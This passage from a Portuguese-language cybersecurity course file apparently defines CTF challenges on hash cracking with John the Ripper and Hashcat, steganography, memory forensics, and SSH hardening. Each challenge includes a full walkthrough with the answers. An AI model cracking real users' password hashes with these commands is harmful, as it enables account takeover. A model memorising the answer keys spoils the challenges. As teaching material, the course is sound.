      * **Hashcat:** O mecanismo de quebra acelerado por GPU mais poderoso do ecossistema, otimizado para drivers OpenCL e CUDA, capaz de utilizar o poder massivo de processamento vetorial de placas gráficas.

      ### 💻 Exemplos Práticos e Sintaxe
      1. **Quebra de Hash MD5 com John the Ripper:**
         ```bash
         # 1. Salvar o hash alvo em um arquivo de texto:
         echo "e10adc3949ba59abbe56e057f20f883e" > /tmp/alvo.hash

         # 2. Executar o John the Ripper indicando o formato raw-md5:
         john --format=raw-md5 /tmp/alvo.hash

         # 3. Visualizar a senha quebrada a partir do banco interno (.potfile):
         john --show --format=raw-md5 /tmp/alvo.hash
         ```
         *Saída esperada:*
         ```text
         ?:123456

         1 password hash cracked, 0 left
         ```

      2. **Utilizando John com a wordlist rockyou e regras de mutação:**
         ```bash
         john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt --rules /tmp/alvo.hash
         ```

      3. **Quebra Equivalente com Hashcat (Aceleração por GPU):**
         ```bash
         # O modo -m 0 especifica o algoritmo MD5 puro; -a 0 especifica ataque de dicionário:
         hashcat -m 0 -a 0 /tmp/alvo.hash /usr/share/wordlists/rockyou.txt
         ```
         *Tabela de modos comuns do Hashcat:*
         * `-m 0`: MD5
         * `-m 100`: SHA-1
         * `-m 1400`: SHA-256
         * `-m 1000`: NTLM (Windows)
         * `-m 13100`: Kerberos 5 TGS-REP (Kerberoasting)
         * `-m 3200`: Bcrypt

      ### 🎯 O que fazer para resolver o desafio (Passo a Passo)
      1. **Localizar e Iniciar o Binário:**
         No terminal do container, execute o desafio:
         ```bash
         /challenge/crypto-john-cracking
         ```
         O programa exibirá o hash MD5 alvo:
         ```text
         e10adc3949ba59abbe56e057f20f883e
         ```
      2. **Quebrar o Hash com John the Ripper no Terminal:**
         Em uma janela de terminal, salve o hash e invoque o John:
         ```bash
         echo "e10adc3949ba59abbe56e057f20f883e" > /tmp/hash.txt
         john --format=raw-md5 /tmp/hash.txt
         john --show --format=raw-md5 /tmp/hash.txt
         ```
         O John the Ripper identificará que a senha em texto claro é:
         ```text
         123456
         ```
      3. **Submeter a Senha Recuperada:**
         No prompt do desafio (`>> `), digite a senha decifrada:
         ```text
         123456
         ```
         *Alternativa:* Invoque o binário diretamente com o parâmetro:
         ```bash
         /challenge/crypto-john-cracking 123456
         ```
      4. **Capturar e Submeter a Flag:**
         O programa validará que o hash MD5 de `123456` confere com o alvo e exibirá a flag no formato:
         ```text
         pwn.college{...}
         ```
         Copie a flag e registre a pontuação no portal.
  - id: crypto-stego-basics
    name: Esteganografia e Análise de Metadados em Imagens
    description: "### \U0001F4D6 Introdução Teórica\nA palavra **Esteganografia** tem origem grega (*steganos* = oculto /\
      \ protegido e *graphein* = escrita) e designa a técnica de ocultar a existência de uma mensagem dentro de um arquivo\
      \ portador (*carrier* ou hospedeiro), de tal modo que terceiros não suspeitem de que há dados secretos em trânsito.\n\
      \n**Diferença Crucial entre Esteganografia e Criptografia:**\n* **Criptografia:** Transforma a mensagem legível em um\
      \ texto incompreensível (*ciphertext*). Qualquer observador sabe que uma mensagem cifrada está passando, mas não consegue\
      \ ler sem a chave.\n* **Esteganografia:** Dissimula a própria presença da mensagem. O observador vê apenas uma foto\
      \ inocente, uma música MP3 ou um documento binário legítimo. Frequentemente, equipes ofensivas combinam ambas as técnicas:\
      \ cifram o payload com AES e depois o esteganografam em uma imagem.\n\n**Técnicas Comuns de Ocultação Digital:**\n1.\
      \ **Dados Injetados após o Marcador de Fim de Arquivo (EOF - End of File):**\n   Formatos de imagem possuem delimitadores\
      \ estritos de terminação:\n   - Arquivos PNG terminam com o chunk `IEND` (`IEND®B`\x82`).\n   - Arquivos JPEG terminam\
      \ com o marcador hexadecimal `ÿÙ`.\n   Quaisquer bytes anexados após essa assinatura de encerramento são ignorados pelos\
      \ visualizadores gráficos usuais, mas continuam fisicamente armazenados no disco, permitindo transporte de arquivos\
      \ compactados e chaves.\n2. **Metadados e Tags EXIF:**\n   Arquivos de mídia contêm seções para informações complementares\
      \ (modelo da câmera, timestamps, coordenadas de GPS e campos de comentário). Invasores podem embutir textos e comandos\
      \ codificados diretamente no campo `Comment` ou `Artist`.\n3. **LSB (Least Significant Bit - Bit Menos Significativo):**\n\
      \   Substitui o último bit de cada byte de componente de cor (Red, Green, Blue) de uma imagem pelo bit do payload secreto.\
      \ A alteração de 1 bit no valor do pixel (ex: de 254 para 255) causa uma variação de cor imperceptível ao olho humano,\
      \ mas possibilita esconder mensagens inteiras nos planos de bits.\n4. **Arquivos Poliglotas e Concatenação:**\n   Técnica\
      \ de embutir um arquivo ZIP dentro de uma imagem PNG (`cat imagem.png segredo.zip > portador.png`). O arquivo abre perfeitamente\
      \ como imagem e simultaneamente pode ser descompactado com utilitários de compressão.\n\n### \U0001F4BB Exemplos Práticos\
      \ e Sintaxe\nFerramentas essenciais no terminal Linux para triagem esteganográfica:\n\n1. **Inspecionar Magic Bytes\
      \ e Tipo Real de Arquivo (`file`):**\n   ```bash\n   file /tmp/suspicious.bin\n   ```\n   *Permite saber se um arquivo\
      \ disfarçado com extensão `.jpg` é na verdade um executável ELF ou um arquivo compactado.*\n\n2. **Extrair Strings Legíveis\
      \ com Comprimento Mínimo (`strings`):**\n   ```bash\n   strings -n 6 /tmp/suspicious.bin | grep -i flag\n   ```\n  \
      \ *A flag `-n 6` filtra apenas sequências imprimíveis com 6 ou mais caracteres consecutivos.*\n\n3. **Inspecionar Assinaturas\
      \ e Carregadores com `binwalk`:**\n   ```bash\n   # Escanear por assinaturas de arquivos embutidos (ZIP, GZ, ELF, etc.):\n\
      \   binwalk /caminho/arquivo.png\n\n   # Extrair automaticamente qualquer arquivo compactado encontrado dentro da imagem:\n\
      \   binwalk -e /caminho/arquivo.png\n   ```\n\n4. **Examinar Metadados Profundos com `exiftool`:**\n   ```bash\n   exiftool\
      \ /tmp/suspicious.bin\n   ```\n   *Exibe tags EXIF, dados de geolocalização e comentários embutidos.*\n\n5. **Análise\
      \ de Planos LSB em Imagens PNG com `zsteg`:**\n   ```bash\n   zsteg -a imagem.png\n   ```\n   *Testa automaticamente\
      \ todas as combinações de canais de cor e ordens de bits LSB.*\n\n6. **Inspeção Hexadecimal de Cabeçalhos com `xxd`\
      \ ou `hexdump`:**\n   ```bash\n   xxd -l 64 /tmp/suspicious.bin\n   ```\n\n### \U0001F3AF O que fazer para resolver\
      \ o desafio (Passo a Passo)\n1. **Localizar e Iniciar o Binário:**\n   No terminal do container, execute o desafio de\
      \ esteganografia:\n   ```bash\n   /challenge/crypto-stego-basics\n   ```\n   O binário criará e depositará o artefato\
      \ suspeito no sistema de arquivos temporário:\n   ```text\n   /tmp/suspicious.bin\n   ```\n2. **Inspecionar as Strings\
      \ do Artefato:**\n   Em uma sessão do terminal, filtre as sequências de texto do arquivo gerado procurando pelo padrão\
      \ `FLAG_HIDDEN_STEGO`:\n   ```bash\n   strings /tmp/suspicious.bin | grep FLAG_HIDDEN_STEGO\n   ```\n   A ferramenta\
      \ revelará a linha embutida nos bytes do binário:\n   ```text\n   ### METADATA_PAYLOAD: FLAG_HIDDEN_STEGO_cyberguard2026\
      \ ###\n   ```\n3. **Submeter a Chave Esteganografada:**\n   No prompt do desafio (`>> `), forneça a chave secreta extraída:\n\
      \   ```text\n   cyberguard2026\n   ```\n   *(Ou submeta diretamente via CLI: `/challenge/crypto-stego-basics cyberguard2026`).*\n\
      4. **Capturar e Submeter a Flag:**\n   O programa homologará a chave extraída da estrutura de bytes e exibirá a flag\
      \ no formato:\n   ```text\n   pwn.college{...}\n   ```\n   Submeta a flag na plataforma para concluir o módulo de criptografia.\n"
- id: forense-defesa
  name: 'Módulo 6: Forense Digital, Resposta a Incidentes (DFIR) & Hardening'
  description: |
    Quando um incidente de segurança é deflagrado, a precisão e a velocidade de resposta definem a sobrevivência da organização. Este módulo foca no respeito irrevogável à Ordem de Volatilidade (RFC 3227), priorizando a aquisição da memória RAM sobre discos estáticos, garantindo a integridade da Cadeia de Custódia.

    Você aprenderá os princípios de hardening de servidores Linux e SSH (chaves criptográficas, desativação de root, fail2ban), além dos alicerces de detecção em Blue Team com SIEM e mapeamento tático através da matriz MITRE ATT&CK.
  resources:
  - name: Análise Forense e Investigação de Incidentes
    type: lecture
    video: https://www.youtube.com/watch?v=JmCq9v1XoX4
    slides: https://pwn.college/forensics
  - name: 'Guia Teórico: RFC 3227 (Ordem de Volatilidade), Custódia e Hardening'
    type: markdown
    content: |
      ### A Ordem de Volatilidade (RFC 3227)

      Ao responder a uma intrusão em um sistema computacional ativo, **nunca desligue o equipamento puxando da tomada ou executando `shutdown` antes de coletar as evidências mais voláteis**. A RFC 3227 estabelece a ordem prioritária de aquisição, do mais volátil para o menos volátil:

      1. **Registradores da CPU e Memória Cache:** Informações duram apenas microssegundos.
      2. **Tabelas de Roteamento, Tabela ARP, Conexões de Rede Ativas e Cache do Kernel.**
      3. **Memória Principal (RAM):** Contém processos em execução, chaves de criptografia em memória, senhas decodificadas, conexões estabelecidas e códigos maliciosos injetados sem arquivo (*fileless malware*). Se desligada a energia, a DRAM apaga-se imediatamente!
      4. **Sistemas de Arquivos Temporários (Swap, /tmp em memória).**
      5. **Discos Não Voláteis (HDD, SSD):** Logs armazenados no disco, arquivos de configuração.
      6. **Logs Remotos e Históricos de Rede:** Gravados em SIEM ou servidores externos.
      7. **Mídias de Backup Físicas e Fitas Magnéticas.**

      ### Cadeia de Custódia (Chain of Custody)
      A Cadeia de Custódia é o registro documental e cronológico minucioso que comprova quem coletou, manuseou, transportou, analisou e armazenou cada evidência digital. Todo artefato deve possuir seu hash criptográfico (ex: SHA-256) calculado imediatamente após a coleta para provar em juízo ou auditoria que a evidência não foi alterada.

      ### Hardening de Servidores Linux e SSH
      * Desabilitar login direto como `root` via SSH (`PermitRootLogin no`).
      * Desabilitar autenticação por senha (`PasswordAuthentication no`), exigindo exclusivamente chaves públicas ED25519 ou RSA 4096 bits.
      * Alterar porta padrão ou implementar controle de firewall com `ufw`/`iptables` e prevenção de força bruta com `fail2ban`.

      ### SIEM e MITRE ATT&CK
      * **SIEM (Security Information and Event Management):** Plataforma centralizadora que agrega, normaliza e correlaciona eventos de segurança de múltiplas fontes em tempo real, gerando alertas de anomalia.
      * **MITRE ATT&CK:** Base de conhecimento globalmente acessível que cataloga táticas, técnicas e procedimentos (TTPs) reais utilizados por adversários avançados (APTs), servindo de referência para caça a ameaças (*threat hunting*).
  challenges:
  - id: dfir-volatility-order
    name: 'Triage Emergencial: Respeitando a RFC 3227'
    description: |-
      ### 📖 Introdução Teórica

      Em computação forense e resposta a incidentes de segurança (DFIR - *Digital Forensics and Incident Response*), o primeiro contato com um sistema comprometido dita o sucesso ou o fracasso de toda a investigação pericial. Diante de um servidor sob ataque ativo, a reação instintiva de operadores destreinados costuma ser desligar imediatamente o equipamento da tomada ou iniciar a cópia de arquivos de log do disco rígido. Essa atitude catastrófica destrói as evidências mais ricas e definitivas do ataque.

      Para padronizar internacionalmente a metodologia pericial, o IETF publicou a norma **RFC 3227** (*Guidelines for Evidence Collection and Archiving*), que institui o princípio universal da **Ordem de Volatilidade**:
      > **"Colete sempre as evidências partindo da fonte mais volátil para a menos volátil."**

      A volatilidade representa a velocidade com que uma evidência se degrada, é sobrescrita ou desaparece permanentemente caso o sistema perca alimentação elétrica, sofra reinicialização ou continue operando rotineiramente.

      ```
      [ MAIS VOLÁTIL - Perece em microssegundos / requer energia ]
              ▲
              │  1. Registradores da CPU e Memória Cache
              │  2. Tabelas de Roteamento, Cache ARP, Conexões TCP/UDP Ativas, Tabela de Processos
              │  3. Memória Principal Física (RAM)
              │  4. Sistemas de Arquivos Temporários (/tmp, /dev/shm, swap, pagefile)
              │  5. Discos Não Voláteis (HDDs, SSDs, sistemas de arquivos, logs em /var/log)
              │  6. Configuração e Topologia Física da Rede
              │  7. Logs em Servidores Remotos (SIEM, syslog externo) e Tráfego Gravado
              │  8. Mídias Físicas de Arquivamento e Fitas de Backup a Frio
              ▼
      [ MENOS VOLÁTIL - Persiste por meses ou anos sem alimentação elétrica ]
      ```

      #### Por que a Memória RAM tem Prioridade Absoluta sobre o Disco?
      A memória dinâmica de acesso aleatório (DRAM) depende de capacitores microscópicos que precisam ser atualizados milhares de vezes por segundo (*refresh cycles*). No instante em que um servidor é desligado ou reiniciado, o fornecimento elétrico cessa e o conteúdo da RAM dissipa-se em frações de segundo.

      Em contrapartida, os discos magnéticos e memórias flash (SSDs) são dispositivos de armazenamento **não voláteis**: os bits gravados em clusters e blocos persistem intactos mesmo sem energia elétrica.

      | Vetor de Análise | Memória RAM Física (Volátil) | Disco Rígido / Logs (Não Volátil) |
      | :--- | :--- | :--- |
      | **Persistência** | Destruída instantaneamente se o host for desligado. | Permanece gravada com o host desligado. |
      | **Fileless Malware** | Executa estritamente no espaço de endereçamento (Process Hollowing, injeção de DLL reflexiva). | Não deixa nenhum executável gravado no sistema de arquivos. |
      | **Credenciais de Acesso** | Tokens Kerberos, senhas em texto puro, chaves de sessão e hashes residem em memória. | Senhas raramente são registradas em arquivos de log limpos. |
      | **Chaves de Criptografia** | Chaves simétricas ativas (ex: AES-256 de ransomware ou sessões TLS) vivem em buffers de processo. | Se a máquina for reiniciada, a chave de decifração é perdida para sempre. |
      | **Conexões de Rede (C2)** | Descritores de sockets de túneis reversos e endereços IP de C2 residem na memória do kernel. | Podem não constar em logs locais se o invasor os desativou ou limpou. |

      #### Relevância Ofensiva e Defensiva
      * **Defensiva (Blue Team / DFIR):** O perito forense deve capturar a imagem da RAM (*dump*) antes de qualquer interação que possa alterar o estado do sistema, garantindo a integridade da **Cadeia de Custódia** através do cálculo de hash criptográfico imediato (SHA-256).
      * **Ofensiva (Red Team):** Invasores avançados utilizam técnicas de malware em memória (*fileless*) justamente para evitar a detecção por antivírus tradicionais baseados em assinaturas de disco e garantir que suas pegadas desapareçam com um simples reboot.

      ---

      ### 💻 Exemplos Práticos e Sintaxe

      A preservação forense da memória volátil envolve ferramentas dedicadas e procedimentos padronizados de integridade:

      #### 1. Coleta Forense de RAM no Linux (LiME - Linux Memory Extractor)
      O módulo de kernel LiME permite extrair a memória física de sistemas Linux com impacto mínimo no espaço de endereçamento:
      ```bash
      # Inserir o módulo LiME indicando o destino do dump e o formato bruto (raw):
      sudo insmod lime-$(uname -r).ko "path=/tmp/ram_forense.lime format=raw"

      # Verificar se o despejo foi concluído com sucesso:
      ls -lh /tmp/ram_forense.lime
      ```

      #### 2. Coleta Forense de RAM no Windows
      Utilizam-se executáveis portáteis que não exigem instalação prévia para não sobregravar clusters de memória:
      ```cmd
      :: Extração física via WinPmem:
      C:\Forensics> winpmem.exe -o C:\Forensics\mem_dump.raw

      :: Extração via DumpIt:
      C:\Forensics> DumpIt.exe /OUTPUT C:\Forensics\memory.dmp
      ```

      #### 3. Garantia da Cadeia de Custódia (Cálculo de Hash Imediato)
      Imediatamente após a geração da imagem forense, calcula-se o hash criptográfico para certificar judicialmente que a imagem não sofreu adulteração:
      ```bash
      # Calcular e armazenar o hash SHA-256 da imagem da memória:
      sha256sum /tmp/ram_forense.lime > /tmp/ram_forense.lime.sha256

      # Inspecionar o hash gerado:
      cat /tmp/ram_forense.lime.sha256
      ```

      #### 4. Inspeção Volátil de Conexões de Rede (Antes de Interromper o Sistema)
      ```bash
      # Listar conexões ativas com processos e sockets associados:
      ss -tulpan
      ```

      ---

      ### 🎯 O que fazer para resolver o desafio (Passo a Passo)

      Siga rigorosamente as instruções abaixo dentro do container para demonstrar o domínio sobre a RFC 3227 e desbloquear a flag:

      1. **Invoque o binário do desafio:**
         No terminal, execute o desafio de triagem forense:
         ```bash
         /challenge/dfir-volatility-order
         ```

      2. **Revise a aula teórica integrada (Opcional):**
         Caso deseje rever os parâmetros normativos da RFC 3227 diretamente no terminal:
         ```bash
         /challenge/dfir-volatility-order --help
         ```

      3. **Avalie o cenário operacional apresentado:**
         O binário apresentará a seguinte questão:
         > *"Diante de um servidor ativo sob ataque, qual evidência deve ser adquirida EM PRIMEIRO LUGAR conforme a RFC 3227?"*
         * A) Disco Rígido e Logs salvos (/var/log/auth.log)
         * **B) Memória RAM física volátil (processos vivos, chaves, sockets)**
         * C) Fitas de Backup externo e imagens de restauração
         * D) Arquivos de configuração do sistema em /etc/

      4. **Forneça a resposta correta:**
         Digite **`B`** (ou `RAM`) no prompt interativo e pressione Enter.
         *Alternativamente, passe a resposta diretamente como argumento:*
         ```bash
         /challenge/dfir-volatility-order B
         ```

      5. **Capture e submeta a flag:**
         O sistema validará a resposta, confirmará a anexação da imagem da RAM à cadeia de custódia e imprimirá a flag:
         ```text
         [+] DEBRIEFING TÉCNICO: RESPOSTA EXATA! OPERAÇÃO BEM-SUCEDIDA.
         [FLAG DE VALIDAÇÃO CYBERGUARD]:
         pwn.college{...}
         ```
         Copie a string completa `pwn.college{...}` e submeta-a para pontuar.
  - id: dfir-memory-dump-inspection
    name: Análise de Imagem de Memória RAM com Volatility
    description: |-
      ### 📖 Introdução Teórica

      A análise forense de memória volátil é um dos ramos mais avançados e reveladores da cibersegurança defensiva. Enquanto a análise de discos rígidos e sistemas de arquivos busca artefatos persistentes gravados no passado, a inspeção da memória RAM (*memory forensics*) revela o estado exato em que o computador se encontrava no momento preciso da captura: processos ativos em execução, fios de execução (*threads*), conexões de rede abertas, credenciais de autenticação decifradas e códigos maliciosos invisíveis no disco.

      #### O Espaço de Endereçamento e Estruturas do Kernel
      Em sistemas operacionais modernos, cada processo em execução recebe um espaço de memória virtual isolado, mapeado e gerenciado pelo hardware da MMU (*Memory Management Unit*):
      1. **Estrutura de Processos (`task_struct` no Linux / `EPROCESS` no Windows):** O kernel mantém listas encadeadas contendo metadados de cada processo — PID, PPID, proprietário, descritores de arquivo abertos e ponteiros de memória.
      2. **Árvore VAD (*Virtual Address Descriptor Tree*):** Estrutura em árvore que registra cada bloco de memória alocado para o processo e suas respectivas permissões de acesso: Leitura (`R`), Escrita (`W`) e Execução (`X`).
      3. **Páginas de Memória Volátil:** Buffers dinâmicos (*heap*) e quadros de pilha (*stack*) armazenam chaves criptográficas simétricas, senhas em texto puro e dados de comunicação enquanto os programas operam.

      ```
      +-----------------------------------------------------------------------------------------+
      |                               IMAGEM BRUTA DA MEMÓRIA RAM                               |
      |                              (/tmp/cyberguard_ram_dump.raw)                             |
      +-----------------------------------------------------------------------------------------+
      |  Kernel Structures: task_struct (PID 1337, Comm: "rev_tunnel.elf")                      |
      |  Active Socket:     192.168.10.45:4444 -> 10.0.0.1:8443 (Túnel C2 Ativo)               |
      |  VAD Protection:    PAGE_EXECUTE_READWRITE (Alerta de Injeção Maliciosa RWX)            |
      |  Process Heap/Stack:                                                                    |
      |    Offset 0x00000420: "CRITICAL_VOLATILE_ARTIFACT: "                                    |
      |    Offset 0x0000043c: "MEM_KEY_AES_256_CYBERGUARD_LIVE"  <--- CHAVE SIMÉTRICA DO C2!    |
      +-----------------------------------------------------------------------------------------+
      ```

      #### O Framework Volatility
      O **Volatility** é o padrão pericial da indústria para análise forense de dumps de memória. O Volatility 3 não executa o binário capturado; ele interpreta de forma estática as estruturas binárias do kernel do sistema operacional a partir de tabelas de símbolos (*Intermediate Symbol Format - ISF*):
      * `linux.pslist` / `windows.pslist`: Percorre a lista encadeada de processos ativos.
      * `linux.pstree` / `windows.pstree`: Exibe a árvore hierárquica de relações pai-filho (`PPID -> PID`).
      * `linux.malfind` / `windows.malfind`: Varre a memória em busca de regiões com proteção atípica de Leitura, Escrita e Execução simultâneas (`RWX`), sintoma clássico de injeção de malware (*Process Hollowing*, *DLL Injection*).
      * `linux.netscan` / `windows.netscan`: Reconstitui os sockets de rede ativos e conexões TCP/UDP no instante da coleta.
      * `linux.bash` / `windows.cmdline`: Recupera comandos digitados no terminal pelo invasor que residem nos buffers de memória.

      #### Relevância Ofensiva e Defensiva
      * **Segurança Defensiva (DFIR / SOC):** Permite recuperar chaves de decifração de ransomwares antes que o processo termine, identificar canais de comando e controle (C2) ocultos e isolar artefatos de intrusão que jamais tocaram o disco rígido.
      * **Segurança Ofensiva (Red Team):** Compreender como os peritos extraem evidências da RAM orienta o desenvolvimento de técnicas evasivas, como ofuscação de buffers em memória e encerramento limpo de sessões.

      ---

      ### 💻 Exemplos Práticos e Sintaxe

      A investigação de imagens de memória combina ferramentas especializadas (Volatility) com filtros avançados de texto e inspeção hexadecimal no terminal:

      #### 1. Varredura com Volatility 3
      ```bash
      # Listar processos em execução na imagem de memória:
      vol -f /tmp/cyberguard_ram_dump.raw linux.pslist

      # Localizar injeções de código e regiões RWX:
      vol -f /tmp/cyberguard_ram_dump.raw linux.malfind

      # Inspecionar sockets de rede abertos:
      vol -f /tmp/cyberguard_ram_dump.raw linux.netscan

      # Recuperar linhas de comando digitadas:
      vol -f /tmp/cyberguard_ram_dump.raw linux.bash
      ```

      #### 2. Extração Rápida de Strings e Chaves em Dumps Brutos (Raw)
      Quando o perfil do kernel não está imediatamente disponível, utilitários GNU permitem localizar padrões textuais conhecidos:
      ```bash
      # Extrair todas as cadeias de texto imprimíveis e filtrar termos de chave:
      strings -a /tmp/cyberguard_ram_dump.raw | grep -i MEM_KEY

      # Extrair padrões com regex direta sobre o binário:
      grep -ao "MEM_KEY_[A-Za-z0-9_]*" /tmp/cyberguard_ram_dump.raw

      # Inspecionar o offset com contexto de bytes em hexadecimal (xxd):
      xxd -s 0x200 -l 128 /tmp/cyberguard_ram_dump.raw
      ```

      #### 3. Saída Esperada no Terminal
      ```text
      [KERNEL_TASK_STRUCT pid=1337 comm=kworker_crypt]
      PROCESS_NAME: rev_tunnel.elf
      SOCKET_ESTABLISHED: 192.168.10.45:4444 -> 10.0.0.1:8443
      ENVIRONMENT_BLOCK: USER=root PATH=/bin:/usr/bin
      CRITICAL_VOLATILE_ARTIFACT: MEM_KEY_AES_256_CYBERGUARD_LIVE
      VAD_PROTECTION: PAGE_EXECUTE_READWRITE
      ```

      ---

      ### 🎯 O que fazer para resolver o desafio (Passo a Passo)

      Siga os passos abaixo para analisar a imagem de memória e validar a resolução:

      1. **Inicie o laboratório do desafio:**
         Execute o executável `/challenge/dfir-memory-dump-inspection`:
         ```bash
         /challenge/dfir-memory-dump-inspection
         ```
         *O desafio gerará a imagem simulada de memória em `/tmp/cyberguard_ram_dump.raw`.*

      2. **Inspecione a imagem de memória gerada em `/tmp`:**
         Utilize o comando `strings` ou `grep` para vasculhar o arquivo de despejo de memória em busca do artefato criptográfico:
         ```bash
         strings /tmp/cyberguard_ram_dump.raw | grep MEM_KEY
         ```
         *Alternativa com grep de bytes:*
         ```bash
         grep -ao "MEM_KEY_[A-Za-z0-9_]*" /tmp/cyberguard_ram_dump.raw
         ```

      3. **Identifique a chave volátil:**
         A inspeção revelará o token de cifragem AES-256 do malware:
         ```text
         MEM_KEY_AES_256_CYBERGUARD_LIVE
         ```

      4. **Submeta a chave ao binário validador:**
         Passe a chave identificada como argumento para o desafio:
         ```bash
         /challenge/dfir-memory-dump-inspection MEM_KEY_AES_256_CYBERGUARD_LIVE
         ```
         *Ou digite-a no prompt interativo caso execute sem argumentos.*

      5. **Capture a flag:**
         O sistema validará o artefato recuperado e liberará a flag de conclusão:
         ```text
         [+] DEBRIEFING TÉCNICO: CHAVE AES-256 RECUPERADA DA MEMÓRIA VOLÁTIL!
         [FLAG DE VALIDAÇÃO CYBERGUARD]:
         pwn.college{...}
         ```
         Copie a flag no formato `pwn.college{...}` para submissão.
  - id: dfir-linux-hardening-audit
    name: Hardening de Bastion Host e Serviço SSH
    description: |-
      ### 📖 Introdução Teórica

      Em segurança da informação defensiva, **Hardening** (endurecimento de sistemas) é o processo metódico e proativo de mitigação de vulnerabilidades com o objetivo de reduzir ao máximo a superfície de ataque de um sistema operacional, serviço de rede ou aplicação. A premissa central é que instalações padrão de sistemas operacionais privilegiam compatibilidade e facilidade de uso em detrimento da segurança, deixando portas abertas, protocolos legados ativos e parâmetros excessivamente permissivos.

      #### Frameworks e Padrões Internacionais: CIS Benchmarks e Lynis
      Para evitar configurações empíricas ou arbitrárias, a indústria adota padrões formais de conformidade como os **CIS Benchmarks** (*Center for Internet Security*), o **NIST SP 800-123** (*Guide to General Server Security*) e ferramentas automatizadas de auditoria como o **Lynis**:
      * **Lynis:** Scanner de auditoria de segurança open-source para sistemas Unix/Linux. Ele varre centenas de pontos do sistema (kernel, serviços de rede, regras de firewall, permissões de arquivos, contas de usuário) e gera um índice de conformidade (*Hardening Index*), indicando parâmetros fora das diretrizes CIS.
      * **Bastion Host (Jump Server):** Servidor dedicado posicionado na fronteira da rede (DMZ) com a finalidade exclusiva de intermediar e monitorar o acesso administrativo remoto aos servidores internos de produção. Comprometer o Bastion Host concede ao invasor as chaves da rede interna.

      ```
      [ ATACANTE NA INTERNET ]              [ BASTION HOST CYBERGUARD ]
               │                                        │
               │-- Tentativa: login root com senha ---->│
               │                                        ├-- [PermitRootLogin no] --> BLOQUEADO!
               │                                        │
               │-- Tentativa: login user com senha ---->│
               │                                        ├-- [PasswordAuthentication no] --> REJEITADO!
               │                                        │
      [ OPERADOR AUTORIZADO ]                           │
               │                                        │
               │-- Apresenta Chave Criptográfica ------>│
               │   (Ed25519 / RSA 4096 bits)            ├-- [authorized_keys Validado] --> SESSÃO CONCEDIDA!
      ```

      #### As Diretrizes Críticas do OpenSSH (`/etc/ssh/sshd_config`)
      O serviço SSH (porta TCP 22) é a principal porta de entrada administrativa de servidores Linux na Internet. Se exposto com parâmetros padrão, ele é bombardeado continuamente por botnets automatizadas executando ataques de dicionário e força bruta.

      | Parâmetro no `sshd_config` | Valor Padrão / Inseguro | Valor Hardened (CIS) | Justificativa de Segurança |
      | :--- | :--- | :--- | :--- |
      | **`PermitRootLogin`** | `yes` | **`no`** | O superusuário `root` (UID 0) existe em 100% dos sistemas Linux. Permitir seu login direto elimina a necessidade de o atacante adivinhar o nome de usuário. Com `no`, o invasor deve descobrir um usuário não privilegiado e, posteriormente, encontrar uma falha para escalar privilégios. |
      | **`PasswordAuthentication`** | `yes` | **`no`** | Senhas são suscetíveis a ataques de força bruta, phishing e reutilização de credenciais vazadas. A política CIS exige **autenticação estrita por chaves criptográficas assimétricas** (Ed25519 ou RSA 4096 bits). |
      | **`MaxAuthTries`** | `6` (ou maior) | **`3`** | Limita as tentativas incorretas de autenticação por conexão TCP antes de desconectar o socket, atrasando severamente varreduras automatizadas. |
      | **`X11Forwarding`** | `yes` | **`no`** | Impede o redirecionamento gráfico de janelas X11, evitando que clientes maliciosos espionem ou interceptem sessões gráficas no host. |
      | **`ClientAliveInterval`** | `0` (desativado) | **`300`** | Envia probes de keepalive a cada 300 segundos e encerra conexões ociosas abandonadas por administradores. |

      ---

      ### 💻 Exemplos Práticos e Sintaxe

      A auditoria e o endurecimento do serviço SSH exigem validação metódica de sintaxe e comandos dedicados de inspeção:

      #### 1. Auditoria Automatizada do Sistema com Lynis
      ```bash
      # Executar auditoria rápida com o Lynis gerando relatório de conformidade:
      lynis audit system --quick

      # Auditar especificamente a categoria de autenticação e SSH:
      lynis audit --tests-category ssh
      ```

      #### 2. Comandos Operacionais de Manutenção do SSH
      Antes de reiniciar o daemon SSH em servidores remotos, é fundamental checar a integridade do arquivo de configuração para evitar a desconexão acidental de todos os operadores (*lockout*):
      ```bash
      # Validar a sintaxe do arquivo de configuração (retorna silencioso se estiver correto):
      sudo sshd -t

      # Exibir os parâmetros ativos consolidados em tempo de execução pelo daemon:
      sudo sshd -T | grep -E "(permitrootlogin|passwordauthentication|maxauthtries)"

      # Recarregar as novas regras sem derrubar as sessões ativas dos administradores:
      sudo systemctl reload sshd
      ```

      #### 3. Modelo de Configuração Hardened (`/etc/ssh/sshd_config`)
      ```ini
      # Configuração em conformidade com CIS Benchmarks Level 2:
      Port 22
      Protocol 2
      PermitRootLogin no
      PasswordAuthentication no
      PubkeyAuthentication yes
      AuthorizedKeysFile .ssh/authorized_keys
      MaxAuthTries 3
      X11Forwarding no
      ClientAliveInterval 300
      ClientAliveCountMax 2
      ```

      ---

      ### 🎯 O que fazer para resolver o desafio (Passo a Passo)

      Siga os passos abaixo para auditar a configuração e responder corretamente ao desafio:

      1. **Inicie o desafio de auditoria:**
         Execute o executável `/challenge/dfir-linux-hardening-audit`:
         ```bash
         /challenge/dfir-linux-hardening-audit
         ```
         *O desafio gerará o arquivo simulado de auditoria em `/tmp/sshd_config_audit`.*

      2. **Inspecione o arquivo auditado:**
         Examine o arquivo de configuração gerado para identificar as fragilidades:
         ```bash
         cat /tmp/sshd_config_audit
         ```
         *Observe as diretrizes permissivas:*
         ```text
         PermitRootLogin yes
         PasswordAuthentication yes
         MaxAuthTries 10
         ```

      3. **Avalie as opções de remediação:**
         O desafio questionará qual conjunto de diretrizes no `sshd_config` eleva substancialmente a segurança do host e aplica conformidade CIS:
         * 1) `PermitRootLogin yes` e `PasswordAuthentication yes`
         * **2) `PermitRootLogin no` e `PasswordAuthentication no` (exigindo chaves criptográficas)**
         * 3) `MaxAuthTries 100` e `PermitEmptyPasswords yes`
         * 4) `Port 22` sem qualquer restrição de usuário ou chave

      4. **Forneça a alternativa correta:**
         Digite **`2`** no prompt interativo e pressione Enter.
         *Alternativamente, envie como argumento de linha de comando:*
         ```bash
         /challenge/dfir-linux-hardening-audit 2
         ```

      5. **Capture e registre a flag:**
         O sistema confirmará a validação da política de hardening CIS e imprimirá a flag:
         ```text
         [+] DEBRIEFING TÉCNICO: POLÍTICA DE HARDENING SSH CONFIRMADA!
         [FLAG DE VALIDAÇÃO CYBERGUARD]:
         pwn.college{...}
         ```
         Copie a string completa `pwn.college{...}` e submeta-a para pontuar.
  - id: dfir-log-correlation-mitre
    name: Correlação de Logs e Mapeamento MITRE ATT&CK
    description: |-
